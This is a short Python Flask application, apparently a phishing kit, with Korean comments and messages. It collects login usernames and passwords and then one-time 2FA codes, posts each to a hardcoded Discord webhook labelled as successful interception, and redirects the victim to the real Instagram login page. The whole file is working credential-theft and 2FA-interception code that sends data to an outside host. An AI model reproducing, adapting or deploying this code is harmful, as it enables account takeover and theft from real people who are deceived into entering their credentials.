import os
import requests
from flask import Flask, render_template, request, redirect, session

app = Flask(__name__)
app.secret_key = "any_fixed_secret_key" # 세션 고정

WEBHOOK_URL = "https://discord.com/api/webhooks/1466648989309997117/2Ah53vvh-hW2S1bZEdLF1i5Qs0YEa1Fmd1_ZXUHjDFk1wRLCLQAADGLpR2HipxuoXWEC"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    session['username'] = username

    # 매크로가 읽기 쉬운 포맷으로 전송
    sync_data = {
        "content": f"🚨 **새로운 정보 감지!**\nID: `{username}`\nPW: `{password}`"
    }
    try:
        requests.post(WEBHOOK_URL, json=sync_data, timeout=5)
    except:
        pass

    return render_template('otp.html')

@app.route('/verify', methods=['POST'])
def verify():
    otp_code = request.form.get('otp_code')
    username = session.get('username', 'Unknown')

    otp_data = {
        "content": f"🚨 **OTP 가로채기 성공!**\n유저: `{username}`\n코드: **{otp_code}**"
    }
    try:
        requests.post(WEBHOOK_URL, json=otp_data, timeout=5)
    except:
        pass

    return redirect("https://www.instagram.com/accounts/login/")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
